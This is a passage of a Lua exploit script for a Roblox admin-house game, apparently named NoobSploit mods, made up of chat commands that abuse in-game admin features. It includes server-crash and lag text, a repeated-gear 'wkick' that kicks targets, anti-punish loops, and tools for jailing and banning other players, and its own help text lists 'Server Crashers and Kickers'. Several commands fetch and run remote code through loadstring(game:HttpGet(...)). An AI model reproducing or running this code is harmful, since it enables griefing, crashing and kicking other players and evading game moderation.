						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.3)
				looping = false
				game.Players:Chat("skydive me")
				wait(0.2)
				game.Players:Chat("respawn me")
				wait(0.2)
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Basteplate")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 15) == prefix.."setspawnpoints" then
		local playername = string.sub(msg:lower(), 17)

		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			Stable_Check = true
			if Workspace_Folder.Spawn1.CFrame.Y < 500 then
				repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = Workspace_Folder.Spawn1.CFrame * CFrame.new(-1*(Workspace_Folder.Spawn1.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.3)
				looping = false
				game.Players:Chat("tp me "..playername)
				wait(0.2)
				game.Players:Chat("respawn me")
				wait(0.2)
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			Stable_Check = true
			if Workspace_Folder.Spawn2.CFrame.Y < 500 then
				repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = Workspace_Folder.Spawn2.CFrame * CFrame.new(-1*(Workspace_Folder.Spawn2.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.3)
				looping = false
				game.Players:Chat("tp me "..playername)
				wait(0.2)
				game.Players:Chat("respawn me")
				wait(0.2)
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			Stable_Check = true
			if Workspace_Folder.Spawn3.CFrame.Y < 500 then
				repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = Workspace_Folder.Spawn3.CFrame * CFrame.new(-1*(Workspace_Folder.Spawn3.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.3)
				looping = false
				game.Players:Chat("tp me "..playername)
				wait(0.2)
				game.Players:Chat("respawn me")
				wait(0.2)
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 13) == prefix.."findresetpad" then
		local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		cf.CFrame = Admin_Folder.Regen.CFrame
	elseif string.sub(msg:lower(), 0, 4) == prefix.."nok" then
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump2.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump1.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump3.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump4.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump5.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump6.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump7.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump8.TouchInterest:Remove()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump.TouchInterest:Remove()
	elseif string.sub(msg:lower(), 0, 14) == prefix.."anticrash on" then
		AntiCrash = true
	elseif string.sub(msg:lower(), 0, 15) == prefix.."anticrash off" then
		AntiCrash = false
	elseif string.sub(msg:lower(), 0, 6) == prefix.."wkick" then
		local name = string.sub(msg:lower(), 8)
		Wwkicking = name
		wkicking = true
	elseif string.sub(msg:lower(), 0, 10) == prefix.."disablerc" then
		logn("Click 1 RC will now be disabled for EVERYONE!")
		game.Players:Chat("gear me 0000000000000000004842207161")
	elseif string.sub(msg:lower(), 0, 10) == prefix.."whitelist" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 12)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				table.insert(Whitelist, v.Name)
				logn("Whitelisted "..v.Name)
			end
		end
	elseif string.sub(msg:lower(), 0, 7) == prefix.."ignore" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 9)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				table.insert(Ignore, v.Name)
				logn("Ignoring "..v.Name)
			end
		end
	elseif string.sub(msg:lower(), 0, 9) == prefix.."unignore" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 11)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				for a,b in pairs(ignore) do
					if b == v.Name then
						table.remove(Ignore, a)
						logn("Unignored "..v.Name)
					end
				end
			end
		end
	elseif string.sub(msg:lower(), 0, 12) == prefix.."unwhitelist" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 14)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				for a,b in pairs(Whitelist) do
					if b == v.Name then
						table.remove(Whitelist, a)
						logn("Unwhitelisted "..v.Name)
					end
				end
			end
		end
	elseif string.sub(msg:lower(), 0, 6) == prefix.."admin" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 8)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				table.insert(Admin, v.Name)
				logn("Whitelisted "..v.Name)
			end
		end
	elseif string.sub(msg:lower(), 0, 8) == prefix.."unadmin" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 10)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				for a,b in pairs(Admin) do
					if b == v.Name then
						table.remove(Admin, a)
						logn("Unwhitelisted "..v.Name)
					end
				end
			end
		end
	elseif string.sub(msg, 0, 14)== prefix.."antipunish on" then
		AntiPunish = true
		while AntiPunish == true do
			if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
				game.Players:Chat("unpunish me")
				wait(.2)
			else 
				wait()
			end
		end
	elseif string.sub(msg, 0, 15)== prefix.."antipunish off" then
		Antipunish = false
	elseif string.sub(msg:lower(), 0, 8) == prefix.."allpads" then
		local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
		for i, pad in pairs(pads) do
			Spawn(function()
				pad.PrimaryPart = pad:FindFirstChild("Head")
				local pos = pad.PrimaryPart.CFrame
				wait(0)
				pad.PrimaryPart.CanCollide = false
				pad:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
				wait(0)
				pad:SetPrimaryPartCFrame(pos)
				pad.PrimaryPart.CanCollide = false
				pad.PrimaryPart.Transparency = 0
			end)
			pad.PrimaryPart.Transparency = 1
		end
	elseif string.sub(msg:lower(), 0, 3) == prefix.."sm" then
		local box = string.sub(msg:lower(), 5)
		hint("Server Message", box)
	elseif string.sub(msg:lower(), 0, 11) == prefix.."set lagall" then
		local Power = tonumber(string.sub(msg:lower(), 15)) -- get the power amount as an int.
		logn("Power is now being set to "..string.sub(msg:lower(), 15))
		logn("Calculating, please wait.")
		local str1 = ""
		for i = Power,1,-1 do 
			str1 = str1..onekspaces.."g"
		end
		crashall_Text = str1
	elseif string.sub(msg:lower(), 0, 10) == prefix.."antidelay" then
		antidelay = tonumber( string.sub(msg:lower(), 12))
	elseif string.sub(msg:lower(), 0, 14) == prefix.."color all all" then
		local Num = tonumber(string.sub(msg:lower(), 16))
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(Num,Num,Num)
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 14) == prefix.."color all red" then
		local Num = tonumber(string.sub(msg:lower(), 16))
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(Num,0,0)
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 17) == prefix.."color all green" then
		local Num = tonumber(string.sub(msg:lower(), 18))
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(0,Num,0)
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 15) == prefix.."color all blue" then
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(0,0,255)
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 17) == prefix.."color all random" then
		logn("This is a strip of Color3 it works its way through every block SLOWLY want it to keep changing then ;spam it")
		game.Players:Chat("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 17) == prefix.."color all random2" then
		logn("This is a strip of Color3 it works its way through every block SLOWLY want it to keep changing then ;spam it")
		game.Players:Chat("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 19) == prefix.."color house random" then
		logn("This is a strip of Color3 it works its way through every block SLOWLY want it to keep changing then ;spam it")
		game.Players:Chat("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		for i,v in pairs(Workspace_Folder["Basic House"]:GetChildren()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 24) == prefix.."color obbybricks random" then
		logn("This is a strip of Color3 it works its way through every block SLOWLY want it to keep changing then ;spam it")
		game.Players:Chat("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		for i, v in pairs(Workspace_Folder["Obby"]:GetChildren()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 18) == prefix.."color obby random" then
		logn("This is a strip of Color3 it works its way through every block SLOWLY want it to keep changing then ;spam it")
		game.Players:Chat("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		for i, v in pairs(Workspace_Folder["Obby Box"]:GetChildren()) do
			Spawn(function()
				if v:IsA("Part") then
					local Partse =
						{
							["Part"] = v,
							["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
						}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 7) == prefix.."tool 1" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("gear "..player.." 00000000000000000079446473")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."tool 2" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("gear "..player.." 000000000000000000236438668")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."tool 3" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("gear "..player.." 00000000000000000018474459")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."tool 4" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("gear "..player.." 000000000000000000124126528")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."tool 5" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("gear "..player.." 00000000000000000035683911")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."btools" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("gear "..player.." 00000000000000000000016200204")
		game.Players:Chat("gear "..player.." 00000000000000000000016200402")
		game.Players:Chat("gear "..player.." 00000000000000000000016969792")
		game.Players:Chat("gear "..player.." 00000000000000000000073089190")
		game.Players:Chat("gear "..player.." 00000000000000000000021001552")
	elseif string.sub(msg:lower(), 0, 8) == prefix.."icewall" then
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000019704064"))
		game:GetService'Players':Chat(("gear me 00000074385399"))
	elseif string.sub(msg:lower(), 0, 7) == prefix.."ctable" then
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
		game:GetService'Players':Chat(("gear me 000000243788010"))
	elseif string.sub(msg:lower(), 0, 4) == prefix.."sus" then
		game:GetService'Players':Chat(("name all Sus"))
		game:GetService'Players':Chat(("paint all red"))
		game:GetService'Players':Chat(("music 6119798028"))
		game:GetService'Players':Chat(("gear all 000000000000000000121946387"))
		game:GetService'Players':Chat(("fogcolor 0 0 0"))
		game:GetService'Players':Chat(("fogend 30"))
	elseif string.sub(msg:lower(), 0, 7) == prefix.."cherry" then
		game:GetService'Players':Chat(("char all 149938264"))
		wait(0.1)
		game:GetService'Players':Chat((".sunrise"))
		wait(0.1)
		game:GetService'Players':Chat(("music 4604502000"))
		wait(0.1)
		game:GetService'Players':Chat(("name all CherrryCatt"))
		game:GetService'Players':Chat(("m CherrryCatt made this command"))
		game:GetService'Players':Chat(("gear all 12547976"))
		game:GetService'Players':Chat(("disco"))
	elseif string.sub(msg:lower(), 0, 6) == prefix.."remix" then
		game:GetService'Players':Chat(("music 222274242"))
		game:GetService'Players':Chat(("disco"))
		game:GetService'Players':Chat(("fogend 100"))
	elseif string.sub(msg:lower(), 0, 7) == prefix.."wlcmds" then
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Whitelisted user commands: .sunrise .sunset .dark .btools .spam .stop .super .clearlogs .bangears .regen .internet .bok .trap .boombox .ds .disablerc","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".sus .rocket .rrocket .gearban .play 1-29 .noob .rat .titan .heykindle .nitroguy .glitchshadow .headfloat .haku .color all random .padban .unpadban .color all original .sm","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Server Crashers and Kickers and Annoying stuff: .troll .crash .wkick .nochat .epilepsy ","All")
	elseif string.sub(msg:lower(), 0, 12) == prefix.."walkonwalls" then
		loadstring(game:HttpGet('https://gist.githubusercontent.com/KholsAdminHouse/a8e44d4f07e2a75709948ad3b2566954/raw/fd279d776c7963ec91c73b7fc0ae9b3a786abdff/gistfile1.txt'))()
	elseif string.sub(msg:lower(), 0, 3) == prefix.."iy" then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	elseif string.sub(msg:lower(), 0, 9) == prefix.."alltools" then
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
			Spawn(function()
				if v:IsA'Tool' then
					v.Parent = game.Players.LocalPlayer.Character
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 7) == prefix.."random" then
		local player = string.sub(msg:lower(), 8)
		game.Players:Chat("char "..player.." 234931862")
		game.Players:Chat("name "..player.." ")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."bacon" then
		local player = string.sub(msg:lower(), 7)
		game.Players:Chat("char "..player.." 88345597")
	elseif string.sub(msg:lower(), 0, 10) == prefix.."headfloat" then
		local player = string.sub(msg:lower(), 12)
		game.Players:Chat("size "..player.." 0.5")
		wait(0.25)
		game.Players:Chat("bighead "..player)
		wait(0.25)
		game.Players:Chat("unsize "..player)
	elseif string.sub(msg:lower(), 0, 5) == prefix.."upme" then
		game.Players.LocalPlayer.Character:Destroy()
	elseif string.sub(msg:lower(), 0, 7) == prefix.."rocket" then
		local player = string.sub(msg:lower(), 9)
		game.Players:Chat("dog "..player)
		wait(0.25)
		game.Players:Chat("size "..player.." 0.3")
	elseif string.sub(msg:lower(), 0, 8) == prefix.."rrocket" then
		local player = string.sub(msg:lower(), 10)
		game.Players:Chat("trail "..player.." rainbow")
		game.Players:Chat("dog "..player)
		wait(0.25)
		game.Players:Chat("size "..player.." 0.3")
	elseif string.sub(msg:lower(), 0, 9) == prefix.."disguise" then
		local player = string.sub(msg:lower(), 11)
		game.Players:Chat("char "..player.." "..math.random(1000000000, 2147483647))
		game.Players:Chat("name "..player)
	elseif string.sub(msg:lower(), 0, 4) == prefix.."rej" then
		game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
	elseif string.sub(msg:lower(), 0, 100) == prefix.."antigear on" then
		AntiGear = true
		for i,v in pairs(plrs:GetPlayers()) do if #v.Backpack:GetChildren() > 0 then plrs:Chat('ungear '..v.Name) end end
	elseif string.sub(msg:lower(), 0, 100) == prefix.."antigear off" then
		AntiGear = false
	elseif string.sub(msg:lower(), 0, 4) == prefix.."rat" then
		local player = string.sub(msg:lower(),  6)
		game.Players:Chat("char "..player.." 6")
		wait(1)
		game.Players:Chat("hat "..player.." 0000000000000000006203125039")
		game.Players:Chat("name "..player.." Rat")
		game.Players:Chat("size "..player.." 0000000000000000000.8")
		game.Players:Chat("speed "..player.." 00000000000000000026")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."titan" then
		local player = string.sub(msg:lower(),  8)
		game.Players:Chat("char "..player.." 4")
		wait(1)
		game.Players:Chat("skydive "..player)
		game.Players:Chat("paint "..player.." red")
		game.Players:Chat("name "..player.." Titan")
		game.Players:Chat("size "..player.." 0000000000000000005")
		game.Players:Chat("speed "..player.." 00000000000000000024")
		game.Players:Chat("pants "..player.." 0000000000000000001187508947")
	elseif string.sub(msg:lower(), 0, 14) == prefix.."playbackspeed" then
		local newPlaybackSpeed = tonumber(string.sub(msg:lower(), 16))
		local Sound = game:GetService("Workspace").Terrain["_Game"].Folder.Sound
		Sound.PlaybackSpeed = newPlaybackSpeed
	elseif string.sub(msg:lower(), 0, 7) == prefix.."volume" then
		local newVolume = tonumber(string.sub(msg:lower(), 9))
		local Sound = game:GetService("Workspace").Terrain["_Game"].Folder.Sound
		Sound.Volume = newVolume
	elseif string.sub(msg:lower(), 0, 9) == prefix.."bangears" then
		game.Players:Chat("gear me 00000000000000000082357101")
		wait(0.50)
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
			Spawn(function()
				if v:IsA'Tool' then
					v.Parent = game.Players.LocalPlayer.Character
				end
			end)
		end
		wait(0.50)
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 11)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
				wait(0.25)
				local JailPlayer = v.Name
				workspace[game.Players.LocalPlayer.Name].PortableJustice.MouseClick:FireServer(workspace[JailPlayer])
				wait(0.25)
				game.Players:Chat("reset "..v.Name)
			end
		end
		wait(0.50)
		game.Players:Chat("gear me 00000000000000000082357101")
		wait(0.50)
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
			Spawn(function()
				if v:IsA'Tool' then
					v.Parent = game.Players.LocalPlayer.Character
				end
			end)
		end
		wait(0.50)
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 11)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
				wait(0.25)
				local JailPlayer = v.Name
				workspace[game.Players.LocalPlayer.Name].PortableJustice.MouseClick:FireServer(workspace[JailPlayer])
				wait(0.25)
				game.Players:Chat("reset "..v.Name)
			end
		end
	elseif string.sub(msg:lower(), 0, 24) == prefix.."toggle antijailgearban" then
		antijailgearban = not antijailgearban
		logn("antijailgearban is now set to "..tostring(antijailgearban))
	elseif string.sub(msg:lower(), 0, 21) == prefix.."toggle antigrayscale" then
		antigrayscale = not antigrayscale
		logn("antigrayscale is now set to "..tostring(antigrayscale))
	elseif string.sub(msg:lower(), 0, 16) == prefix.."toggle antikill" then
		antikill = not antikill
		logn("antikill is now set to "..tostring(antikill))
	elseif string.sub(msg:lower(), 0, 17) == prefix.."toggle antijail" then
		antijail = not antijail
		logn("antijail is now set to "..tostring(antijail))
	elseif string.sub(msg:lower(), 0, 19) == prefix.."toggle mymusiconly" then
		mymusiconly = not mymusiconly
		logn("mymusiconly is now set to "..tostring(mymusiconly))
	elseif string.sub(msg:lower(), 0, 16) == prefix.."toggle antilogs" then
		antilogs = not antilogs
		logn("antilogs is now set to "..tostring(antilogs))
	elseif string.sub(msg:lower(), 0, 13) == prefix.."toggle mmoid" then
		mymusiconly_ID = tonumber(string.sub(msg:lower(), 15))
		logn("mymusiconly_id is now set to "..tostring(mymusiconly_ID))
		mymusiconly = true
	elseif string.sub(msg:lower(), 0, 17) == prefix.."toggle superlogs" then
		Superlogs = not Superlogs
		logn("Superlogs is now set to "..tostring(Superlogs))
	elseif string.sub(msg:lower(), 0, 23) == prefix.."toggle padsenforcement" then
		padsEnforcement = not padsEnforcement
		logn("padsEnforcement is now set to "..tostring(padsEnforcement))
	elseif string.sub(msg:lower(), 0, 24) == prefix.."toggle everyonecommands" then
		everyonecommands = not everyonecommands
		logn("everyonecommands is now set to "..tostring(everyonecommands))
	elseif string.sub(msg:lower(), 0, 18) == prefix.."toggle antiattach" then
		antiattach = not antiattach
		logn("antiattach is now set to "..tostring(antiattach))
	elseif string.sub(msg:lower(), 0, 18) == prefix.."toggle antivoid" then
		antivoid = not antivoid
		logn("antivoid is now set to "..tostring(antivoid))
	elseif string.sub(msg:lower(), 0, 12) == prefix.."togglenames" then
		print("----- Anti's -----")
		print("antijailgearban "..tostring(antijailgearban))
		print("antigrayscale "..tostring(antigrayscale))
		print("antikill "..tostring(antikill))
		print("antijail "..tostring(antijail))
		print("mymusiconly "..tostring(mymusiconly))
		print("mmoid (mymusiconly_ID) "..tostring(mymusiconly_ID))
		print("antilogs "..tostring(antilogs))
		print("superlogs (Superlogs)"..tostring(Superlogs))
		print("everyonecommands "..tostring(everyonecommands))
		print("padsenforcement (padsEnforcement)"..tostring(padsEnforcement))
		print("antiattach"..tostring(antiattach))
		print("antivoid"..tostring(antivoid))
		print("")
	end
	-- loadstring(game:HttpGet("https://pastebin.com/raw/BnccXAFV", true))()
end)

function regen()
	fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
end

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function()
	if antikick == true then
		for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
			if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "EFFECTGUIBLIND" or v.Name == "HintGUI" then
				v:Destroy()
			end
		end
		for i,v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
			if v.Name == "Message" then
				v:Destroy()
			end
		end
		game.Lighting.FogEnd = 9e9
	end
end)

function transformToColor3(col) -- Oofkohls
	local r = col.r
	local g = col.g
	local b = col.b
	return Color3.new(r,g,b);
end

Spawn(function()
	while true do
		wait(0.05)
		if teskking == false then
			game.Players:Chat("pm "..Wteskking.." "..oofkohlsPmSpam)
		end

		if spamming == true then
			game.Players:Chat(Wspamming)
			wait(delay)
		end

		if wkicking == true then
			game.Players:Chat("gear "..Wwkicking.." 000000000000000000253519495")
		end

		if antijailgearban == true then
			if game.Players.LocalPlayer.Character:FindFirstChild("Part") then
				game.Players.LocalPlayer.Character:FindFirstChild("Part"):Destroy()
				wait(0.25)
				game.Players:Chat("speed me 16")
				game.Players:Chat(prefix.."set jp 50")
				if AllowMessages == true then
					if allowads == true then
						game.Players:Chat("")
					else
						game.Players:Chat("")
					end
				end
			end
		end
	end
end)

binarylist = {
	['0'] = '0000',
	['1'] = '0001',
	['2'] = '0010',
	['3'] = '0011',
	['4'] = '0100',
	['5'] = '0101',
	['6'] = '0110',
	['7'] = '0111',
	['8'] = '1000',
	['9'] = '1001',
	['10']= '1010',
	['11']= '1011',
	['12']= '1100',
	['13']= '1101',
	['14']= '1110',
	['15']= '1111'
}

function tobinary(num) -- While great it maxes at 15 D:
	if num > 15 then
		error([[-- NoobSploit mods error --
Number "]]..num..[[" is way to big to create a
4bit binary number from
(Not reportable)
ID #0011 (4-bit Binary Number)
-- NoobSploit mods error --]])
	else
		return binarylist[tostring(num)]
	end
end

spawn(function()
	function Backup() -- In work
		data = ""
		if antijailgearban == true then
			data = "1"
		else
			data = "0"
		end
		if antigrayscale == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if antikill == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if antijail == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if antikill == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if Superlogs == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if everyonecommands == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if padsEnforcement == true then
			data = data.."1"
		else
